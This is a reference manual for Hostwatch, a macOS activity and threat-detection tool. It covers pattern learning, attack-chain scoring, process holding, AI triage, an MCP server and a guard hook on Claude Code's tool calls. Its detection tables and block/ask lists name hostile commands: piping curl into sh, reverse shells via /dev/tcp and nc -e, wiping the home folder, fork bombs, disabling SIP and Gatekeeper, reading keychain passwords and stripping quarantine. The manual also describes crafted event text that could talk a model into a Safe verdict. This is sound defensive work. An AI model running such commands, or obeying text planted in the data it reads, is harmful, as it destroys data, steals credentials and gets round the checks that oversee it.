# Hostwatch reference

Detailed behaviour, rules and thresholds. For an overview, start with the [README](../README.md).

A compact macOS activity overlay (optionally click-through). One line per event:

| Icon | Kind | Shows |
|------|------|-------|
| ▶ cyan | new process (`exec`) | name, `pid ← ppid`, time |
| 🌐 green | new connection | name, `TCP/UDP remote:port`, time |
| 📄 orange | newly opened file | name, `r/w/rw path`, time |

Each kind of control has one home:

- **Menu bar icon (〰): a glance and quick actions.** The status line (Live / Paused / Collector off,
  open stories, high-risk patterns), *N processes held — Review…* while something is held,
  **Start Collector…** when it's off, **Open Hostwatch** (⌘O), **Stories / Patterns / Domains** with
  badges, Pause Live Stream, **Show HUD** (⌃⌥⌘H, works from any app), Hold Suspicious Processes,
  **Settings…** (⌘,) and Quit.
- **App menu bar** (while a Hostwatch window is open):
  - *View*: Events ⌘1 · Patterns ⌘2 · Rules ⌘3 · Stories ⌘4 · Domains ⌘5, the **Show** filter
    (by pattern status), event-kind toggles, Show HUD, Enter Full Screen (⌃⌘F; Esc leaves).
  - *Activity*: Pause, Clear Events (⌘K), Ask AI About Selection (⌘↩), Mark Safe / Suspicious /
    Dangerous, Exclude Selection…, Start/Stop Collector.
  - *Window*: Activity Window (⌘0), Held Processes. *Help*: this reference, Use with Claude Code…,
    Collector Log, Full Disk Access Settings.
- **Settings window (⌘,)**: *General* (collector, start at launch, log, Full Disk Access), *HUD*
  (show, click-through, background: Glass, Clear Glass, Solid or None with preview tiles, contrast, text size, reset size and position), *Detection* (hold,
  Homebrew trust, domain learning, ignored stories), *AI* (engine, on-device status, Claude Code
  command), *Exclusions* (the editor) and *History* (recording, size, location, clear).
- **Right-click a row** (events, patterns, domains, and the HUD while click-through is off): Ask AI,
  mark its pattern, **Exclude ▸** a process, host or folder, copy, reveal in Finder.

Kind toggles only **hide** rows: collecting, patterns, stories and history always get every kind.
Turning **Click-through** off (it's off by default) lets you move and resize the HUD with the mouse:
drag its header bar to move it and the ◣ grip in its bottom-left corner to resize. Width changes
smoothly; height snaps to whole rows; the top-right corner stays put. Position and size are
remembered. Quitting also stops the collector the app started.

## Built-in collector

The collector script is bundled in `Hostwatch.app/Contents/Resources`. At launch (toggle
**Settings ▸ General ▸ Start collector when Hostwatch opens**), the app checks for an existing collector socket (`/var/run/hostwatch/collector.sock`). If none
is running, it asks for an administrator password and starts it as root as a temporary
launchd job (`system/local.hostwatch.collector`, gone after reboot). The job runs
`Hostwatch --collector-launcher`, which spawns the agent. macOS then treats Hostwatch.app as
the responsible process for eslogger, so Full Disk Access must be granted to **Hostwatch.app**, with output going to
`~/Library/Logs/Hostwatch/agent.log` (*Help ▸ Collector Log*).

- **Stop Collector** sends a shutdown command carrying a random token. The token is written
  with mode 0600 to `~/Library/Application Support/Hostwatch/collector.token` and passed to the agent.
- The agent also exits within about 2 s if the app that launched it dies (`--owner-pid`).
- `eslogger` needs Full Disk Access. If the log shows `ERR_NOT_PERMITTED`, use
  **Open Full Disk Access Settings** and enable Hostwatch, then start the collector again.
  The app checks for this before asking for your password and shows a guide if access is missing.
  Builds are ad-hoc signed by default, so **every rebuild needs the grant redone**: remove the old
  Hostwatch entry with − and add it again. To avoid this, build with a stable identity:
  `CODESIGN_IDENTITY="Apple Development: you@example.com (TEAMID)" ./scripts/build-app.sh`.
- `./scripts/run-agent.sh` runs the collector by hand from Terminal (`sudo Hostwatch --collector`).
  The app detects it and does not start a second one.

## Patterns: learn normal, surface the strange

Every event gets a **signature**, a normalized fingerprint of *who did what*. Events with the same
signature are grouped into one **pattern**:

| Kind | Signature | Example |
|------|-----------|---------|
| process | parent program → executable | `Microsoft Excel → /usr/bin/osascript` |
| connection | process → proto, host bucket, port | `Slack → TCP internet:443`, `curl → TCP 45.33.*.*:8081` |
| file | process → mode, folder or file | `rg → r ~/Documents/work/src/*`, `rg → r ~/todo.txt`, `agent → r ~/.ssh/*  [SSH keys]` |

Normalization: home → `~`, `$TMPDIR`, UUIDs, hex IDs and version numbers → placeholders (also in
executable names that are only a version, e.g. `claude/versions/#.#.#`).

**The general rule: no pattern covers a whole area** (`SignatureBuilder.specificPath`, for every program).
A wildcard needs at least 2 folders below home (`~/Documents/work/*`) or 3 elsewhere
(`/Users/Shared/tools/*`); a file in a shallower folder is its own pattern (`r ~/todo.txt`,
`r ~/Documents/a.pdf`, `r /tmp/x.log`, `r /usr/bin/ls`). Patterns name the file's folder; for apps, trees
deeper than 4 folders below home (5 elsewhere) end in `/**` there (`~/Projects/app/node_modules/a/**`), while
interpreters and shells always get the exact folder. So `r *`, `r ~/*`, `r ~/Documents/**`, `r /*`,
`r /tmp/*` or `r /Users/**` never exist, can't be a learned Safe rule, and "Mark All … From This Process ▸ Safe"
is gone (Suspicious or Dangerous for a whole program still work). Undecided or automatic wide patterns from
earlier versions are dropped at launch; ones you decided stay. On a real day of history: 1,219 → 2,803
patterns, mostly routine (auto Safe); patterns to decide 150 → 227. Labelled places stay as before:
- **sensitive places**, for any access: SSH/GPG keys, cloud and registry credentials, keychains,
  TCC, cookies, Safari/Mail/Messages data, browser credential stores, local accounts, sudoers.
  These are tagged `[label]`.
- **autostart locations**, for writes only: LaunchAgents/Daemons, cron/at/periodic, login items and
  shell rc files. These are tagged `[persistence]`.
- **an app's own data folder**: `~/Library/Application Support/<App>` or `~/.<app>`, when the
  name matches the actor. These are tagged `[own data]`.

**Built-in safe patterns.** macOS's own behaviour, the same on every Mac, is decided as routine out of the box
(`BuiltInSafe`): any program *reading* `~/.CFUserTextEncoding` (CoreFoundation's text-encoding preference);
`/usr/sbin/networksetup` running `/bin/sh -c ‹/bin/cp …/SystemConfiguration/preferences.plist …›` (its settings
backup); `sh`/`bash /usr/libexec/tmp_cleaner` (Apple's temp clean-up script); and SystemUIServer running
`screencapture …com.apple.screenshot.launcher…` (a screenshot you took). Only exact patterns; when a parent is named
it must be that program on the sealed, read-only system volume, so a copy elsewhere or the same command from
another program doesn't count. Signing still applies (a swapped binary is high-risk) and stories ignore automatic
decisions. Existing New patterns that match are decided at the next launch. Your own developer activity (scripts,
hooks, `kubectl`, `codesign`…) isn't universal, so it's not built in: mark it, combine it or let rules learn it.

**Combining patterns.** Select two or more patterns of one kind in Patterns, then right-click (or *Mark Selected*)
▸ *Combine… into One Pattern*. A sheet proposes the shared pattern: their common shape, token by token, with `*`
where they differ (`r ~/Documents/work/alpha/*` + `…/beta/*` → `r ~/Documents/work/*/*`), editable for the
program and the pattern. It must cover every chosen pattern and stay specific (the general rule above; bare
wildcards refused). Every existing pattern it covers is merged too: counts add up, first and last seen span them,
the most serious status wins (Dangerous, Suspicious; New when Safe and New are mixed). From then on, activity
whose own pattern it matches joins it instead of creating a new one, and rows already on screen follow it.
*Separate Combined Pattern* undoes it (new activity makes its own patterns again).

**Tidying (routine noise only).** 30 seconds after launch and then daily, Hostwatch removes routine Safe patterns
(decided automatically as ordinary: system reads, caches, scratch writes) not seen for 30 days (they come back if
they happen again), and folds routine Safe patterns of one program that differ only in random parts (a token with
digits and letters such as `cache-aB#dE#`, `<hex>`, `<uuid>`, or a long mixed-case code) into one combined pattern,
marked automatic. A fold needs at least 3 patterns, must pass the not-too-wide rule and may cover nothing but
routine Safe patterns. Nothing New, reopened or decided by you, a rule, the baseline or an AI is touched; and if
activity that joins a fold later isn't routine, the fold goes back to New. On a real store: 16,490 → 15,963 on the
first run (62 folded into 14), pruning grows as patterns age. The Patterns footer shows the last result.

**Connections:** public IPs on web ports (80/443/53/853/123) become `internet`. Other ports keep the /16.
Loopback, LAN, link-local, CGNAT and multicast are named. Ports ≥ 49152 become `ephemeral`.

**Risk.** Each new pattern gets a local risk level, computed only from what is in the pattern:
- **routine**: auto-marked **Safe** (source `auto`), never sent to Claude and never highlighted
  as NEW. This covers reads of system, app, cache and container files; scratch writes (temp,
  caches, containers, prefs); anything done by binaries on the sealed system volume (except
  LOLBins like `curl` and `osascript`); launchd/xpcproxy starting system services (one pattern);
  loopback traffic; and an app touching its own data.
- **high**, shown with a 🔥: access to a sensitive place by a non-owner, persistence writes,
  executables running from temp/Downloads/`/Users/Shared`/volumes, GUI apps spawning
  shells/interpreters/LOLBins, and LOLBins talking to public IPs on unusual ports.
- **normal**: everything else.

**Code signing** refines that, looking only at the binary the pattern names (what runs, or what
acts). Each binary is inspected once per version (Security framework: signed or not, ad-hoc,
Apple, Team ID, organisation, CDHash, quarantine flag). Its signature is fully validated in the
background, and checked again when the file changes:
- **Unsigned or ad-hoc code that is quarantined or runs from a download/temp folder** → high.
  Unsigned code elsewhere (Homebrew, your builds, bundled runtimes) is left to the path rules.
- **Apple or a trusted developer** doing non-sensitive things → routine. Sensitive places,
  autostart writes and spawning shells/LOLBins keep their rules.
- **Signature no longer matches the binary** (modified) → high.
- **Binary replaced:** a known path whose signer changes in a way an update wouldn't explain
  (signed → unsigned/ad-hoc, Apple → non-Apple, different Team ID) → high, plus a Stories stage.
- **Trusted developers** start as the Team IDs of the signed, non-quarantined apps already in
  `/Applications` (your baseline). New vendors stay untrusted until you right-click a pattern →
  **Trust Developer “…”**, or remove one with **Stop Trusting**. Patterns are re-scored right away.
  Facts are saved in `~/Library/Application Support/Hostwatch/signing.json`.
- Measured on today's history: normal patterns 247 → 191. The 57 that became routine are all
  Developer-ID apps (Claude Code, Cursor, Chrome…) doing everyday things. Debug tool:
  `Hostwatch --signing-check <path>…` (set `HOSTWATCH_SIGNING_DB` for a scratch database).

On 2.67M real events this gives about 7.3k patterns: 6.5k routine (auto-safe), about 750 normal and
about 50 high-risk. The old per-folder scheme produced about 20k, all of them New.

Each pattern has a status: **New / Safe / Suspicious / Dangerous**, plus who set it (you, Claude,
auto or baseline) and a short reason. Patterns are saved to
`~/Library/Application Support/Hostwatch/signatures-v2.json`. The old `signatures.json` is not
migrated and can be deleted.

- **Show filter**: one setting, the same control on the Events and Patterns tabs and in the menu
  (*View ▸ Show*). It applies to the HUD, Events and Patterns together: *All Activity*,
  *Hide Safe*, *Only New (not reviewed)*: unclassified plus Suspicious/Dangerous decided only by
  Claude or the baseline, *Only Important* (flagged + new high-risk) or *Only Suspicious & Dangerous*.
  The event that first shows a pattern is tagged ✦ (Events) or **FIRST** (HUD); the *New* status means the pattern isn't decided yet. Flagged rows get a red or orange stripe, safe rows a green one. All rows use full-contrast text.
- **Events and Patterns tables**: native columns. Events show Time · Kind · Status · Process · PID ·
  PPID · Detail; Patterns show Status (🔥 = high-risk) · Kind · Process · Pattern · Signer · Reason ·
  Count · First Seen · Last Seen. Click a column header to sort, and again to reverse; each table
  remembers its sort. Columns can be resized and reordered. Double-click a row to ask Claude. Patterns
  use the Show filter, can be searched and multi-selected. Right-click to mark one or many patterns, or **Mark All … From This Process**
  as a whole-process rule.
- **Decided By** column: *You*, *Rule: …*, *Baseline: Slack (…)*, *AI (on-device)* / *AI (Claude)*,
  *AI suggests Safe* (waiting for you), *Automatic (routine)* or *New*. **Needs You…** opens Rules ▸ Needs You.
- **AI suggests, you decide.** *Ask AI for Suggestions* (Rules ▸ Needs You) sends up to 40 New patterns
  (high-risk first, then most recent), with code-signing facts, to the on-device model and/or Claude (one
  headless `claude -p` call, about 8 s and $0.03). Each verdict is stored as a **suggestion** on the pattern;
  nothing changes until you **Accept** it. *Suggest for new patterns automatically* (Settings ▸ AI) repeats this
  every 90 s for patterns older than a minute. *Accept AI suggestions without asking* applies them by
  themselves, except for high-risk patterns.
- **Classify with AI** (Events and Patterns toolbars) does it for every New pattern that no AI has looked at:
  batches of 40, high-risk first, with a progress bar and Cancel. The popover shows the count, the engine and the
  rough cost (on-device free; Claude about $0.03 per batch), and whether to **apply the verdicts** or **keep them
  as suggestions**. A failing Claude (offline, not installed) stops the run.
- No AI overrides a decision you made, suggests Safe for a high-risk pattern, or trusts an interpreter, shell
  or similar tool (python, bash, node, curl, osascript…: they run whatever they're told). A single **Ask AI**
  verdict also becomes a suggestion for that event's pattern.
- **Launches of interpreters and tools** (perl, python, bash, ditto, curl, osascript…) name what was run, not just
  the program: the script for an interpreter (`bash → /usr/bin/perl ~/bin/build.pl`), the code for `-c`/`-e`
  (`sh -c ‹curl -s https://x/p | sh›`, first 80 characters), otherwise the arguments with paths and numbers
  normalised (`ditto -x -k ~/Downloads/app.zip ~/Downloads`, up to ~120 characters). A bare program run alone
  stays as it is.
- **Interpreters and shells** (python, bash, node, curl, osascript…): network patterns name the destination's
  domain (`TCP pythonhosted.org:443`) or address, never `internet`; file patterns follow the general rule
  (above) with the exact folder even in deep trees.
- **Interpreters can't be trusted wholesale:** *Mark All … From This Process ▸ Safe* is disabled for them, a
  learned Safe rule that covers them broadly is refused, and the baseline never trusts them (macOS's own
  `/bin/bash` or `/usr/bin/python3` included). Blanket trust from earlier versions (whole-process Safe, or Safe by
  AI or the baseline) is undone at launch; your own per-pattern decisions stay.

Debug helper: `Hostwatch.app/Contents/MacOS/Hostwatch --signature-report <history.jsonl>` prints
how a history file groups into patterns and risk levels (`REPORT_KIND=file|net|exec|routine|normal|high`,
`REPORT_GREP=…`, `REPORT_TOP=n`).

## Stories: chains, not single events

One event rarely proves anything: an app starting `sh`, a download, an outbound connection are
all everyday. Attacks are *chains*. Hostwatch tags suspicious **stages** and adds them up per
**process tree** over a 15-minute window:

| Stage | Example | Weight |
|-------|---------|--------|
| Download | write into `~/Downloads`, `/Users/Shared` | 1 |
| Quarantine removed | `xattr -d com.apple.quarantine …` or `xattr -c(r) …` (not `-p`/`-l`) | 3 |
| Ran downloaded/temp file | exec from Downloads, temp, `/Users/Shared`, volumes | 2 |
| App spawned shell | Slack/Office/a browser starting `sh`, `python`, `osascript` | 3 |
| System tool | `curl`, `nc`, `osascript`, `base64`, `security`, `launchctl` … | 1 |
| Encoded/piped command | `curl … \| sh`, `base64 -d`, `osascript -e`, `python -c` | 3 |
| Autostart write | LaunchAgents/Daemons, login items, shell rc files | 4 |
| Credential access | keychains, SSH/cloud keys, browser stores, `security find-generic-password` (unless a trusted signed parent reads its own item) | 3 |
| Outbound connection | to a public IP/host | 1 |
| Unsigned download ran | unsigned/ad-hoc code, quarantined or in a download/temp folder | 3 |
| Binary replaced | a known path whose signer changed (see Code signing) | 5 |
| New domain | first contact with a domain after the baseline (see New domains) | 2 |
| Beaconing | steady-interval contacts from an untrusted program or to a raw IP/new domain | 3 |
| Raw-IP connection | public IP, unusual port, no DNS answer, untrusted program | 2 |

- **Trees:** each app action, launchd job, or command typed in a terminal is its own tree; its
  children stay together. A file written by one tree and then run (or un-quarantined) by another
  joins the stories. Browser `.crdownload` files are matched too, e.g.
  *Google Chrome → xattr → Cleaner*: download · quarantine removed · ran it · LaunchAgent · beacon.
- **Firing:** at least two stages, score ≥ 5, and a strong stage (quarantine removal, encoded command,
  autostart, credentials) or an app spawning a shell. Trees started from your own terminal/IDE need
  score ≥ 6 with a strong stage, so `go run` from `$TMPDIR` plus `curl` stays quiet.
  **Dangerous** at score ≥ 8, or autostart + network, or quarantine removal + running the file.
- Patterns **you** marked Safe never feed stories. Claude/baseline verdicts do, because they judged
  one step alone.
- **Shown:** a pinned banner at the top of the HUD (double-click opens it), a **Stories** tab with the
  full timeline (**Ask Claude** sends the whole chain), a sound when a story first fires, and
  **Stories** in the menu. **Always Ignore This Chain** mutes the same origin + set of stages.
- New processes now carry their **command line** (secrets like tokens, passwords and URL
  credentials are masked by the collector), shown in the Activity list and given to Claude.
- Tested on one day of real history (2.67M events): 2 stories, both Claude Code itself running
  `security` and reading `~/.gnupg`. Synthetic attack chains fire as Dangerous.
  Replay any history: `Hostwatch --story-replay <history.jsonl>`.

## Hold suspicious processes (opt-in)

*Settings ▸ Detection ▸ Hold suspicious processes*, also in the menu bar icon (off by default). When an event adds a strong story stage, Hostwatch
sends its process `SIGSTOP` and shows a floating panel with Allow, Always Allow (marks the pattern Safe),
Kill and Ask AI. The stages are a piped or encoded command, a credential read, a login item, quarantine
removal, running a just-dropped file, or a swapped binary. A program that is a new high-risk pattern
is held too.

- **Only yours.** The app runs as you, so root and other users' processes can't be held. Patterns marked
  Safe, Hostwatch itself, launchd, system UI (`/System/Library/CoreServices`, `/System/Applications`) and
  terminals or editors are never held. At most 5 holds at once. The pid's path is checked before
  every signal, so an exited, reused pid is left alone.
- **No answer in 60 s:** let it continue (default) or kill it (*If No Answer in 60 s*).
- **Fails open.** Each hold starts a detached watchdog (`sleep 65; kill -CONT pid`), so a process
  can't stay frozen if Hostwatch quits or crashes. Quitting or turning the hold off resumes everything.
- **Best effort.** Events arrive after the fact, so a quick `curl` can finish before it is stopped.
  Slower steps (installers, scripts, long downloads) are caught. Blocking before execution would need
  Endpoint Security AUTH events or a Network Extension filter.

## New domains: first contact gets attention

Hostwatch keeps an inventory of every **registrable domain** programs connect to
(`edge.slack.com` → `slack.com`): first and last seen, connection count, hostnames and programs.
Saved in `~/Library/Application Support/Hostwatch/domains.json`.

- **Counted:** hostnames confirmed by DNS, or named on the command line (inferred connections).
- **Not counted:** reverse-DNS provider names, IP-only connections, `.local`/`.arpa` names, and
  macOS system daemons (they talk to Apple constantly).
- **Baseline:** on first launch, every domain in recorded history counts as known, and the next
  **hour** is a learning period (Domains tab → *End Learning Now* to stop early). A domain first reached
  during learning by unsigned, ad-hoc or quarantined code, or a program in Downloads / Shared / a volume,
  is not learned: it stays new.
- **New domain:** first contacted after the baseline. For **1 hour** its connections carry a
  purple **NEW DOMAIN** badge in the HUD and the Events list. They pass *Only Important*,
  *Only New* and *Hide Safe*, and add a **New domain** stage (weight 2) to Stories. Example:
  *Slack → sh → curl* fetching from a never-seen domain is Dangerous.
- **Domains tab** (and *Domains* in the menu, with a badge): new domains (first seen in the last
  24 h) or all of them, sortable by first/last seen, connections, programs. Right-click to
  **Mark Known**, mark as not known, copy, or **Forget** a domain.
- Test with a replay: `REPLAY_LEARN_MINUTES=30 Hostwatch --story-replay <history.jsonl>` lists the
  domains that would be flagged after that much learning.

### Domain details and risk score

Double-click a domain in the Domains tab (or right-click ▸ *Details & Ask AI…*). The window shows the domain
with New / Usual / Known, beaconing and untrusted-program chips, and a **local risk score (0–100)** with
each reason and its points: not usual on this Mac +20 (first seen in the last 24 h +10), reached by unsigned,
ad-hoc, quarantined or downloaded software +30, beaconing +25, an often-abused top-level domain (.xyz, .top,
.zip, …) +15, an internationalised `xn--` name +15, a random-looking (generated) name +15; known −30, usual
(baseline) −20, used by 3+ programs −10. Below it: hostnames, current addresses, first and last contact (open
the first in Time Travel), the programs with their signers, and recent connections. **Ask AI** (Claude or
on-device, same bar as event details) answers with a verdict, confidence and its own **RISK** score; the
evidence it gets is in the collapsed section and can be edited first.

## Beacons and raw-IP connections

Two more per-connection signals (like new domains, not part of pattern keys):

- **Beaconing:** one program contacting one destination (domain, or IP without a name) at a steady
  interval: at least 6 contacts, average gap 10 s–1 h, jitter ≤ 25%. Many apps do this legitimately
  (Slack's heartbeat every ~2 min, telemetry), so it only counts when the program is **untrusted or a
  system tool** (`curl`, `python`, …), or the destination is a **raw IP or a new domain**. Then the
  connection carries **BEACON ~60s** and a strong **Beaconing** stage goes to Stories.
- **Raw-IP connection:** a public IP on an unusual port (not 80/443/53/853/123) with no DNS answer
  before it, from an untrusted program or system tool → **RAW IP** badge and a **Raw-IP connection**
  stage in Stories.
- Both pass *Only Important*, *Only New* and *Hide Safe*. On ~2 hours of real history: 0 beacons and
  0 raw-IP alerts; the one periodic flow (Slack → slack.com every ~125 s) was correctly ignored.

Homebrew ad-hoc-signs what it builds, so signing can't vouch for `git`, `kubectl`, `fish`…: they're judged
by the path rules like your own builds, and you decide their patterns. *End Now* for domain learning is in
Settings ▸ Detection.

## AI engine and triage

**Settings ▸ AI** picks which AI Hostwatch uses (with the on-device model's status):

| Engine | AI suggestions for patterns | Ask AI (event or story) |
|--------|------------------------------|-------------------------|
| **Apple On-Device (private)** | on-device only; what it can't settle stays New | on-device model |
| **Claude** | Claude only | Claude |
| **On-Device First, Claude for the Rest** (default) | steps 1 and 2 below | Claude |

The Ask window also has a **Claude / On-device** switch per question. On-device answers use the same
format (VERDICT line first), with the evidence shortened to ~6,000 characters to fit the model's
~4,000-token context window; reading local files is Claude-only. An on-device "SAFE" from Ask never marks
a high-risk pattern Safe. Earlier versions' two toggles are migrated to the matching engine.

**Claude usage** (Settings ▸ AI): tokens and cost of every Claude run Hostwatch made (Ask AI, classifying
patterns, Suggest Rules), counted across launches from each `claude -p` result (`usage`, `total_cost_usd`):
"1.2M tokens · $3.41", with runs and the start date under it, per feature and input/cached/output in the
tooltip. Failed runs that still reached Claude count too. **Reset** starts from zero; *Reset Hostwatch* with
settings clears it. The on-device model is free and isn't counted.

### Claude Code guard

*Settings ▸ AI ▸ Claude Code guard* (off by default) adds a `PreToolUse` hook to Claude Code's user settings
(`~/.claude/settings.json`, original kept as `settings.json.before-hostwatch`): matcher
`Bash|Write|Edit|MultiEdit|NotebookEdit|Read|Grep|WebFetch`, command `'<Hostwatch>' --claude-hook`, timeout 90 s.
The hook (about 15 ms) passes the call to the app over a private Unix socket
(`~/Library/Application Support/Hostwatch/guard/claude.sock`, 0600, same user only); if the app isn't running it
judges the call itself with the same rules, without the threat lists.

| Verdict | Examples | What happens |
|---|---|---|
| **Block** | `rm -rf ~`, `/`, `~/Documents`; `find ~ -delete`; `/dev/tcp`, `nc -e`; `diskutil eraseDisk`, `dd of=/dev/…`; a fork bomb; `csrutil disable`, `spctl --master-disable`; editing TCC.db; a secret sent to a paste or webhook site; a known malware domain or IP; deleting or changing Hostwatch's files | `deny`: it doesn't run; Claude is told why and to ask you to run it yourself |
| **Ask** | `curl … \| sh`, `bash <(curl …)`, `base64 -d \| sh`; `sudo`; `osascript`; launch agents, shell startup files, `authorized_keys`, `/etc`, Claude Code's own settings; `launchctl load`, `crontab`; `security find-generic-password -w`, SSH keys, AWS/GitHub/Docker/Kubernetes credentials, browser data (also via Read/Grep, whose content would go to Claude); `xattr -d com.apple.quarantine`; recursive deletes outside the project; `$VAR/` deletes; a bare public IP; `pkill Hostwatch`; scripts run with `bash x.sh` or written by Claude that do any of this | `ask`: Claude Code asks you, with the reason |
| **Nothing** | everything else | Claude Code's normal permissions |

Hostwatch never answers `allow`, so it can only make Claude Code stricter. When Claude Code won't ask
(`bypassPermissions`, `dontAsk`), a Hostwatch panel asks instead (Block is the default; no answer in 60 s
blocks). In `claude -p` runs Claude Code turns `ask` into a refusal by itself. Hostwatch's own Claude runs
don't load user settings, so they aren't checked. The log (*Show Log…*) keeps the last 300 blocked or asked
calls (secrets masked); the tray shows blocks in the last 24 hours. The hook's state is checked every 30 s:
removed from the settings (*Restore*), or all hooks switched off by `disableAllHooks`. Limits: it judges the
text of a call, so well-hidden code can get through; Hostwatch's monitoring still sees what then runs.

Classification steps:

1. **On-device pass** (engines with on-device): Apple's on-device model (`SystemLanguageModel`, never Private
   Cloud Compute) looks at each pattern on its own: program, activity, signer and trust, local risk,
   count, with secrets masked and the text marked as data. It answers SAFE / SUSPICIOUS / DANGEROUS /
   UNSURE with a confidence (structured output, greedy decoding).
2. **Claude** (engines with Claude): one Claude call for whatever step 1 did not settle.

Routing (`TriageRouter`, unit-tested):

| On-device says | Normal-risk pattern | High-risk pattern |
|----------------|---------------------|-------------------|
| SAFE, high confidence | **settled Safe** (source *on-device*) | Claude, else left for you |
| SAFE medium/low, UNSURE | Claude, else left for you | Claude, else left for you |
| SUSPICIOUS / DANGEROUS | Claude, else flagged (*on-device*) | Claude, else flagged |
| model unavailable | Claude, else left for you | Claude, else left for you |

**Apple's safety filter.** The on-device model has built-in guardrails that can refuse text that looks
like hacking or credential theft, which is what security evidence is. Ask AI uses Apple's
`permissiveContentTransformations` mode, meant for analysing such text. If the model still refuses, Hostwatch
retries once with the core evidence (event, process, parent chain, executable) and says so; if that is refused
too, it explains why and suggests Claude. Background triage treats a refusal as "couldn't decide" (the pattern
goes to Claude or stays New). `HOSTWATCH_LIVE_MODEL_TESTS=1 swift test --filter OnDeviceModel` runs the real
model on security evidence (needs Apple Intelligence).

No AI verdict ever marks a high-risk pattern Safe, from the on-device model or Claude, in triage, Classify
New or Ask AI: event text (file paths, process names, hostnames) can be crafted to talk a model into it,
so a high-risk pattern stays New until you decide. AI verdicts never remove steps from Stories either
(only your own decisions do).
The menu shows the model's state: ready, still downloading, Apple Intelligence off, or Mac not eligible
(Intel). When unavailable, everything goes to Claude as before.

## Rules tab: Needs You, Rules, Decisions

Every pattern is decided by **you**, a **rule** (learned or baseline), or an **AI suggestion** you accepted, in
that order of authority. The Rules tab shows it in three views (its toolbar label counts what waits for you):

- **Needs You:** New patterns, one row per app with its reasons (see the baseline section), the AI's
  suggestions (*AI suggests: Safe ×3 · on-device AI*) with **Accept**, **Trust**, **Dismiss** and *⋯*
  (Show in Patterns, Mark Suspicious), and Claude's rule proposals (**Approve** / **Reject**). Rebuilt live
  as patterns change; interpreters, shells and Hostwatch itself aren't listed.
- **Rules:** baseline rules (code signatures, no AI: **Update Baseline**) and learned rules (**Suggest Rules…**).
- **Decisions:** who decided which patterns, by app: *Patterns AI decided*, *Patterns you decided* (one by one,
  each covers only itself), *…decided by learned rules*, *…decided by baseline rules*,
  each with **Undo** (back to New) for AI and your decisions.
- Every row (needs-you apps, baseline and learned rules, decided groups) has *N patterns ›*: click it to list
  those patterns in place (high risk first; up to 40, with *Open in Patterns* for all of them).

## Rules learned from your decisions

**Suggest Rules…** (Rules ▸ Rules ▸ Learned rules) sends your decisions (patterns *you* marked; secrets masked), your existing
rules and the story chains you always ignore. Claude's own verdicts are deliberately not used, so rules
don't amplify the AI. Claude returns up to 8 rules: `kind` (exec/net/file/any), `process` glob, `pattern`
glob (`*`, `?`, case-insensitive) and an action (Safe/Suspicious/Dangerous), with a short rationale. It
needs Claude, so it's disabled when the engine is *Apple On-Device*.

Every proposal is checked locally before you see it:

| Check | Effect |
|-------|--------|
| matches one of your decisions with a different status | **refused** (conflict) |
| program and pattern both name fewer than 4 letters/digits | **refused** (too general) |
| matches no pattern, or > 25% of all patterns (with ≥ 200 patterns) | **refused** |
| based on none of your decisions | warning |
| a Safe rule covering New high-risk patterns | warning (shows how many) |
| a Safe rule covering an interpreter or shell broadly (program or pattern < 4 letters) | **refused** |

While it runs, **Needs You** shows a progress card (how many of your decisions were sent, a live timer,
**Cancel**) and the Rules tab reads *Rules (…)*; afterwards a result line says how many proposals came back
and how many passed the checks (or why none did). **Approve** applies a rule; **Reject** drops it. Approved rules are saved in `rules.json`.

**Precedence:** your markings and the baseline > your rules > Claude/on-device verdicts > automatic
routine. A rule's verdict counts as yours: it satisfies *Only New (not reviewed)*, and a Safe rule
removes matching steps from Stories.

**Each rule's own regression test:** at approval it stores the decisions it must keep matching
(examples) and those it must never match (all your other decisions). It is re-checked at launch and
whenever you mark something. If it now matches a counter-example, loses an example, or contradicts any
of your decisions, it is **paused** with the reason, until you resume it (if it passes again) or delete
it. Patterns a paused or deleted rule had classified go back to their own state.

`Hostwatch --suggest-rules` is a dry run for development: it asks Claude, checks the proposals and prints
them, changing nothing.

## MCP server (`Hostwatch --mcp`)

A read-only Model Context Protocol server over stdio (JSON-RPC, protocol versions 2025-06-18,
2025-03-26, 2024-11-05) for Claude Code. There's no network listener: Claude Code starts the process and talks over stdin/stdout.

- **Access** (*Settings ▸ AI ▸ Use with Claude Code*, or *Help ▸ Use with Claude Code…*) is off by default.
  Turning it on creates a random token (`hwmcp_` + 64 hex) and shows the command to run once:
  `claude mcp add --scope user hostwatch -e HOSTWATCH_MCP_TOKEN=<token> -- <path to Hostwatch.app>/Contents/MacOS/Hostwatch --mcp`
  (it first removes an older `hostwatch` registration). The token is shown once: Hostwatch keeps only its
  SHA-256 in `mcp-token.sha256` (mode 600) and compares in constant time.
- **Refusals:** with access off, or a missing or outdated token, the server answers every request with an
  error (`-32001`) saying how to fix it, and serves no data. **New Token…** invalidates earlier
  registrations; turning access off invalidates all of them.
- **Access log:** each session start is recorded (time, allowed/refused, the program that started it) in
  `mcp-access.log`; the last five show in Settings.
- **Limits of a token:** it keeps out MCP clients you didn't set up, and makes access revocable and visible.
  A program already running as your user could still read Hostwatch's files directly, as it can any of
  your files.

| Tool | What it returns |
|------|-----------------|
| `hostwatch_overview` | collector state, pattern counts by status (new high-risk too), open stories, new domains, history span and size, AI engine |
| `search_events` | recorded events newest first: `query` (text in name/path/target/host/command line; `~` = home; case-insensitive for the usual spellings), `kind`, `pid`, `since`/`until` (`30m`, `24h`, `7d`, `today`, `yesterday`, ISO 8601; default last 24 h), `limit` (≤ 300) |
| `search_patterns` | patterns with status/risk/count/first/last/who decided: `query`, `status` (new/safe/suspicious/dangerous/flagged), `risk`, `kind`, `sort` |
| `list_stories`, `get_story` | stories (numbered newest first) and one story's full timeline (`id` = number or id prefix) |
| `list_domains` | domain inventory: `only_new`, `query`, `limit` |
| `process_tree` | ancestors (respecting PID reuse: the latest start of a pid before its child), children during the process's lifetime, its recent connections and file activity |
| `signing_info` | signer, Team ID, ad-hoc, quarantine, Apple, trusted, replaced-at-path, full validity check |

- **Data:** reads `signatures-v2.json`, `stories.json`, `domains.json` and the history files (saved data is at
  most ~30 s behind the app); works when the app is closed. History is streamed with byte-level search
  (memchr/memmem) and only files that can contain the range are read, up to 2 GB per query.
- **Safety:** every tool is annotated read-only; there are no tools that change anything. Output is masked
  with the same rules as Ask AI and capped at 40,000 characters. The server's instructions tell Claude to
  treat the data as evidence, never as instructions.

## Ask Claude: is this dangerous?

In the activity window, **double-click** any process, connection or file row, or right-click it →
**Ask Claude: Is This Dangerous?…**. A window opens and collects local evidence:

- `ps` details and the parent process chain
- code signature and Team ID, Gatekeeper (`spctl`), quarantine flag, SHA-256, file metadata
- reverse DNS and the process's current connections (network events)
- file type and flags (file events)
- other recent activity from the same PID

